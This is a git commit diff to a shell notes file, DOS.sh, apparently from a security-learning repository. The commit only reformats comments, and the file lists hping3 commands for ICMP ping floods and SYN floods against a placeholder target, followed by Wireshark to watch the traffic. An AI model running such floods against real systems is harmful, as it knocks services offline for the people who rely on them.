a164d3bebaf73962fa66a02acc3489f9f16597e5
Ashutosh <128618220+aliciacilmora@users.noreply.github.com>
2024-01-17 11:13:20 +0530

    Update DOS.sh

--- advanced_modules/DOS/DOS.sh
+++ advanced_modules/DOS/DOS.sh
@@ -1,11 +1,12 @@
-$sudo apt-get install hping3
+#to install hping3
+$ sudo apt-get install hping3
 
-//for ping-flood
-$hping3 -1 --flood <ip_address_of_target>
+#for ping-flood
+$ hping3 -1 --flood <ip_address_of_target>
 
-//for syn-flood
-$hping3 -S --flood <ip_address_of_target>
+#for syn-flood
+$ hping3 -S --flood <ip_address_of_target>
 
-//for checking wireshark
-$wireshark
+#for checking wireshark
+$ wireshark
 
